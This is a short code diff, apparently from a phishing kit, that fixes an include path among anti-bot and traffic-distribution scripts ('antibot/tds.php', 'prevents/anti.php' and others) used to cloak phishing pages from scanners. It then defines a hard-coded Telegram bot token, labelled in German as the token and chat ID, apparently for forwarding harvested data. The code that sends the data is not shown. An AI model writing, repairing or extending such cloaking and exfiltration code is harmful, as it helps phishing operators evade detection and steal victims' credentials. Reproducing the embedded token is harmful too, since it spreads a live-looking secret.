@@ -6,7 +6,7 @@ include './antibot/tds.php';
 include './prevents/anti.php';
 include './prevents/anti2.php';
 include './prevents/sub_anti.php';
-include './prevents/block.php.php';
+include './prevents/block.php';
 
 // Telegram Bot Token und Chat-ID
 $botToken = "8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q";
